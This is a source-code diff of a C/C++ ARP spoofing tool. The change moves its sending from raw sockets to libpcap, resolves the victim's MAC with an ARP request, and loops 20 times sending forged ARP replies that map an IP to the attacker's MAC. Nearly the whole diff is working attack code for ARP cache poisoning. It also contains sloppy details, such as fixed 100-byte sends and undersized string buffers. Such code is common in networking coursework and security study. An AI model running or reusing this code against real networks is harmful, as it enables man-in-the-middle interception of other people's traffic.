@@ -23,40 +23,44 @@ struct Parameter_Pthread{
 // smac : attacker's wrong mac
 // tip : victim's ip
 // tmac : victim's mac
-void Attack(void* info){
+void Attack(void* info, pcap_t* handle){
   struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
   struct in_addr src_in_addr, target_in_addr;
-  struct ARP_header attack_packet; // reply
-  struct sockaddr sa;
-  int sock;
-  sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
-  if(sock<0){ perror("socket error"); exit(1); }
+  struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
+  //struct sockaddr sa;
+  //int sock;
+  //sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
+  //if(sock<0){ perror("socket error"); exit(1); }
 
-  attack_packet.frame_type = htons(ARP_FRAME_TYPE);
-  attack_packet.mac_type = htons(ETHER_MAC_TYPE);
-  attack_packet.prot_type = htons(IP_PROTO_TYPE);
-  attack_packet.mac_addr_size = ETH_MAC_ADDR_LEN;
-  attack_packet.prot_addr_size = IP_ADDR_LEN;
-  attack_packet.op = htons(OP_ARP_REPLY);
+  attack_packet->frame_type = htons(ARP_FRAME_TYPE);
+  attack_packet->mac_type = htons(ETHER_MAC_TYPE);
+  attack_packet->prot_type = htons(IP_PROTO_TYPE);
+  attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
+  attack_packet->prot_addr_size = IP_ADDR_LEN;
+  attack_packet->op = htons(OP_ARP_REPLY);
 
   tomar_ip_addr(&src_in_addr, PP->sip);
   tomar_ip_addr(&target_in_addr, PP->tip);
 
-  tomar_mac_addr(attack_packet.Destination_mac_addr, PP->tmac);
-  tomar_mac_addr(attack_packet.target_mac_addr, PP->tmac);
-  tomar_mac_addr(attack_packet.src_mac_addr, PP->smac);
-  tomar_mac_addr(attack_packet.sender_mac_addr, PP->smac);
+  tomar_mac_addr(attack_packet->Destination_mac_addr, PP->tmac);
+  tomar_mac_addr(attack_packet->target_mac_addr, PP->tmac);
+  tomar_mac_addr(attack_packet->src_mac_addr, PP->smac);
+  tomar_mac_addr(attack_packet->sender_mac_addr, PP->smac);
 
-  memcpy(attack_packet.sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
-  memcpy(attack_packet.target_ip_addr, &target_in_addr, IP_ADDR_LEN);
+  memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
+  memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
 
-  bzero(attack_packet.padding, 18);
-  strcpy(sa.sa_data, DEFAULT_DEVICE);
+  bzero(attack_packet->padding, 18);
+  //strcpy(sa.sa_data, DEFAULT_DEVICE);
 
   printf("\n----------_ARP_----------\n");
   //Print_ARP(&attack_packet);
-  if(sendto(sock, &attack_packet, sizeof(attack_packet), 0, &sa, sizeof(sa)) < 0){
-    perror("sendto error");
+  //if(sendto(sock, &attack_packet, sizeof(attack_packet), 0, &sa, sizeof(sa)) < 0){
+  //  perror("sendto error");
+  //  exit(1);
+  //}
+  if(pcap_sendpacket(handle, reinterpret_cast<u_char*>(attack_packet), 100) != 0){
+    perror("send packet error");
     exit(1);
   }
 }
@@ -106,59 +110,11 @@ void convert_mac(const char* data, char* cvrt_str, int s){
 // @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
 int main(int argc, char* argv[]) {
-  if (argc != 2) {
+  if (argc != 3) {
     usage();
     return -1;
   }
 
-// ########## Find my gateway mac address ##########  
-// jamesj@jamesj-VirtualBox:~/arp_test$ arp -a
-// ? (192.168.168.102) at 3c:f0:11:28:2a:67 [ether] on enp0s3
-// _gateway (192.168.168.1) at c8:3a:35:11:45:98 [ether] on enp0s3
-//    0            1        2          3            4    5    6
-  FILE* fp = NULL; char line[100]; char* gw_mac_addr; char* dev;
-  if((fp = popen("arp -a", "r")) == NULL){ return 1; }
-
-  int cnt2 = 0;
-  while(1){
-    fgets(line, 100, fp);
-    //printf("%s\n", line);
-    char* ptr1; int cnt1 = 0;
-    char* line_result1[10];
-    char* line_result2[10];
-    ptr1 = strtok(line, " ");
-    while(ptr1 != NULL){
-      //printf("%s\n", ptr1);
-      line_result1[cnt1] = ptr1;
-      cnt1++;
-      ptr1 = strtok(NULL, " ");
-    }
-    cnt1 = 0;
-    char* final_dst = (char*)malloc(sizeof(char) * 20);
-    if(final_dst == NULL) { perror("final_dst malloc fail"); exit(1); }
-    char* dst = (char*)malloc(sizeof(char) * 20);
-    if(dst == NULL) { perror("dst malloc fail"); exit(1); }
-    char* src = line_result1[1];
-    delChar(src, dst, '(');
-    delChar(dst, final_dst, ')');
-    
-    char* ptr2 = strtok(final_dst, ".");
-    while(ptr2 != NULL){
-      //printf("%s\n", ptr2);
-      line_result2[cnt1] = ptr2;
-      cnt1++;
-      ptr2 = strtok(NULL, ".");
-    }
-    if(!(strncmp(line_result2[3], "1", strlen(line_result2[3])))){
-      dev = line_result1[6];
-      *(dev+(strlen(dev)-1)) = 0;
-      gw_mac_addr = line_result1[3];
-      break;
-    }
-    cnt2++;
-    if(cnt2 > 10) break;
-  }
-  pclose(fp);
 // ########################################
 
 // ########## Make a file to write ##########
@@ -215,93 +171,67 @@ int main(int argc, char* argv[]) {
     }
     convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data)), s_mac_addr, sizeof(s_mac_addr)-1);
   }
+  char* a_mac_addr = (char*)malloc(sizeof(s_mac_addr));
+  if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
+  delChar((char*)s_mac_addr, a_mac_addr, ':'); //s_mac_addr
+
 // ########################################
 
 // ########## Make a pcap environment ##########
   char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+  pcap_t* handle = pcap_open_live(DEFAULT_DEVICE, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL) {
-    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+    fprintf(stderr, "couldn't open device %s: %s\n", DEFAULT_DEVICE, errbuf);
     return -1;
   }
 // ########################################
 
-// ################ Using Socket ################
-  /*printf("[ Starting to find sender's mac address ]\n");
-  struct ARP_header* arph;
+// ################ Using pcap sendpacket ################
+  printf("[ Starting to find sender's mac address ]\n");
+  struct ARP_header* ah = (struct ARP_header*)malloc(sizeof(struct ARP_header));
   struct in_addr src_in_addr, target_in_addr;
-  struct sockaddr sa;
-  char* sender_mac = (char*)malloc(sizeof(ETH_MAC_ADDR_LEN)*3);
+
+  ah->frame_type = htons(ARP_FRAME_TYPE);
+  ah->mac_type = htons(ETHER_MAC_TYPE);
+  ah->prot_type = htons(IP_PROTO_TYPE);
+  ah->mac_addr_size = ETH_MAC_ADDR_LEN;
+  ah->prot_addr_size = IP_ADDR_LEN;
+  ah->op = htons(OP_ARP_REQUEST);
 
   tomar_ip_addr(&src_in_addr, s_ip_addr);
   tomar_ip_addr(&target_in_addr, argv[1]);
-  memcpy(normal.sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
-  memcpy(normal.target_ip_addr, &target_in_addr, IP_ADDR_LEN);
 
-  tomar_mac_addr(normal.Destination_mac_addr, "ffffffffffff");
-  tomar_mac_addr(normal.target_mac_addr, "000000000000");
-  tomar_mac_addr(normal.src_mac_addr, s_mac_addr);
-  tomar_mac_addr(normal.sender_mac_addr, s_mac_addr);
-  bzero(normal.padding, 18);
+  tomar_mac_addr(ah->Destination_mac_addr, "ffffffffffff");
+  tomar_mac_addr(ah->target_mac_addr, "000000000000");
+  tomar_mac_addr(ah->src_mac_addr, a_mac_addr);
+  tomar_mac_addr(ah->sender_mac_addr, a_mac_addr);
 
-  int s = 0; int one = 1; int i = 0;
-  if((s = socket(AF_INET, SOCK_PACKET, SOCK_PACKET)) < 0){
-      fprintf(stderr, "\nError : sending the packet\n", pcap_geterr(handle));
-      exit(1);
-  }
-  setuid(getuid());
-  if(setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char*)&one, sizeof(one)) < 0){
-    perror("setsockopt : SO_BROADCAST");
+  memcpy(ah->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
+  memcpy(ah->target_ip_addr, &target_in_addr, IP_ADDR_LEN);
+
+  bzero(ah->padding, 18);
+
+  if(pcap_sendpacket(handle, reinterpret_cast<u_char*>(ah), 100) != 0){
+    perror("send packet error");
     exit(1);
   }
-  sa.sa_family = 0;
-  strcpy(sa.sa_data, dev);
+  struct pcap_pkthdr* header;
+  const u_char* packet;
+  int res = pcap_next_ex(handle, &header, &packet);
+  struct ARP_header* temp = (struct ARP_header*)(packet);
+  //check_ARP(packet);
+  char* sender_mac = (char*)malloc(sizeof(char) * 20);
+  sprintf(sender_mac, "%x%x%x%x%x%x", temp->sender_mac_addr[0], 
+temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], temp->sender_mac_addr[4], temp->sender_mac_addr[5]);
+  printf("sender_mac : %s\n", sender_mac);
 
-  while(1){
-    //if((i = sendto(s, &normal, sizeof(normal), 0, &sa, sizeof(sa))) < 0){
-    //  perror("sendto");
-    //  exit(1);
-    //}
-
-    struct pcap_pkthdr* header;
-    const u_char* packet;
-    bool isSender = false;
-    int res = pcap_next_ex(handle, &header, &packet);
-    if (res == 0) continue;
-    if (res == -1 || res == -2) break;
-    arph  = (struct ARP_header*)(packet);
-    if((int)htons(arph->prot_type) == 2048){
-      printf("arph->prot_type : %d\n", htons(arph->prot_type));
-      printf("arph->op : %d\n", htons(arph->op));
-      printf("arph->sender_ip_addr : %d\n", arph->sender_ip_addr[3]);
-    }
-    else { printf("Packet is not ARP\n"); }	
-    if((int)htons(arph->op) != 2){
-      printf("ARP packet is not Reply\n");
-    }
-    else{
-      sprintf(sender_mac, "%0x%0x%0x%0x%0x%0x", arph->sender_mac_addr[0], 
-arph->sender_mac_addr[1], arph->sender_mac_addr[2], arph->sender_mac_addr[3], arph->sender_mac_addr[4], arph->sender_mac_addr[5]);
-      isSender = true;
-    }
-    if(isSender) { 
-      printf("Sender's MAC address : %s\n", sender_mac);
-      printf("[ Succes to find sender's MAC address ]\n");
-      break;
-    }
-    else { printf("< Fail to find sender's MAC address >\n"); }
-    sleep(2);
-  }
-*/
-
+/*
 // ################ Using Ping & ARP table ################
   printf("[ Starting to find sender's mac address ]\n");
-  FILE* fp_arp_table = NULL; FILE* fp_ping = NULL;
-  char line2[100];
-  char* line_result1[10];
-  char* sender_mac;
+
 
   printf("[ Ping to victim ]\n");
+  FILE* fp_ping = NULL;
   // Ping to victim
   char* ping_str = (char*)malloc(sizeof(char) * 50);
   //strncat(ping_str, argv[1], sizeof(argv[1]));
@@ -309,8 +239,13 @@ arph->sender_mac_addr[1], arph->sender_mac_addr[2], arph->sender_mac_addr[3], ar
   printf("%s\n", ping_str);
   if((fp_ping = popen(ping_str, "r")) == NULL){ return 1; }
   pclose(fp_ping);
-
+*/
+/*
   printf("[ Open ARP table ]\n");
+  FILE* fp_arp_table = NULL;
+  char line2[100];
+  char* line_result1[10];
+  char* sender_mac;
   // Find a complete arp tuple
   if((fp_arp_table = popen("arp -a", "r")) == NULL){ return 1; }
   while(1){
@@ -344,32 +279,31 @@ arph->sender_mac_addr[1], arph->sender_mac_addr[2], arph->sender_mac_addr[3], ar
     }
   }
   pclose(fp_arp_table);
+*/
   printf("[ Success to find sender's mac address : %s ]\n", sender_mac);
 
 // ########################################
 
-  char* a_mac_addr = (char*)malloc(sizeof(s_mac_addr));
-  if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
-  delChar((char*)s_mac_addr, a_mac_addr, ':'); //s_mac_addr
 
 // ########## Make contents of parameters ##########
-  pt.sip = (char*)malloc(strlen(s_ip_addr)); // sender's ip address
-  if(pt.sip == NULL){ perror("pt.argv_1 malloc error"); exit(1); }
-  pt.smac = (char*)malloc(strlen(sender_mac)); // sender's mac address
-  if(pt.smac == NULL){ perror("pt.argv_2 malloc error"); exit(1); }
+  pt.sip = (char*)malloc(strlen(argv[1])); // sender's ip address
+  if(pt.sip == NULL){ perror("pt.sip malloc error"); exit(1); }
+  pt.smac = (char*)malloc(strlen(a_mac_addr)); // sender's mac address
+  if(pt.smac == NULL){ perror("pt.smac malloc error"); exit(1); }
 
-  pt.tip = (char*)malloc(strlen(argv[1])); // attacker's ip address
-  if(pt.tip == NULL){ perror("pt.aIPaddr malloc error"); exit(1); }
-  pt.tmac = (char*)malloc(strlen(gw_mac_addr)); // attacker's mac address
-  if(pt.tmac == NULL){ perror("pt.aMACaddr malloc error"); exit(1); }
+  pt.tip = (char*)malloc(strlen(argv[2])); // attacker's ip address
+  if(pt.tip == NULL){ perror("pt.tip malloc error"); exit(1); }
+  pt.tmac = (char*)malloc(strlen(sender_mac)); // attacker's mac address
+  if(pt.tmac == NULL){ perror("pt.tmac malloc error"); exit(1); }
 
-  strncpy(pt.sip, s_ip_addr, strlen(s_ip_addr));
-  strncpy(pt.smac, gw_mac_addr, strlen(gw_mac_addr));
-  strncpy(pt.tip, argv[1], strlen(argv[1]));
+  printf("my mac address : %s\n", a_mac_addr);
+  strncpy(pt.sip, argv[2], strlen(argv[2]));
+  strncpy(pt.smac, a_mac_addr, strlen(a_mac_addr));
+  strncpy(pt.tip, argv[1], strlen(argv[1])); // gateway ip
   strncpy(pt.tmac, sender_mac, strlen(sender_mac));
 // ########################################
 
-for(int i = 0; i < 10; i++) { Attack((void*)&pt); sleep(1); }
+for(int i = 0; i < 20; i++) { Attack((void*)&pt, handle); sleep(1); }
 
 // ########## Receiving packets ##########
   /*int count = 0;
